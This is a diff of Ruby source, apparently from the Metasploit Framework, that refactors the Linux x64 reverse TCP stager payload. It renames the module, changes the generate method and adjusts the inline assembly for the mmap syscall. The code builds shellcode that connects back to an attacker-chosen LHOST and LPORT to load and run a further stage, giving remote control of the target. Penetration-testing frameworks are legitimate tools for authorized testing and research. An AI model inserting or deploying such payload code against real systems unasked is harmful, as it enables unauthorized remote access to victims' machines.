@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/linux'
-
 module Msf
 
 
@@ -13,15 +9,15 @@ module Msf
 #
 ###
 
-module Payload::Linux::ReverseTcp_x64
+module Payload::Linux::X64::ReverseTcp
 
   include Msf::Payload::TransportConfig
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X64::Prepends
 
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
@@ -54,8 +50,7 @@ module Payload::Linux::ReverseTcp_x64
   #
   def generate_reverse_tcp(opts={})
     asm = asm_reverse_tcp(opts)
-    buf = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
-    apply_prepends(buf)
+    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 
   #
@@ -100,7 +95,7 @@ module Payload::Linux::ReverseTcp_x64
 
     asm = %Q^
       mmap:
-        xor    rdi, rdi
+        xor    edi, edi
         push   0x9
         pop    rax
         cdq
@@ -109,8 +104,9 @@ module Payload::Linux::ReverseTcp_x64
         xor    r9, r9
         push   0x22
         pop    r10
-        mov    dl, 0x7
-        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
+        push   0x7
+        pop    rdx
+        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
         test   rax, rax
         js failed
 
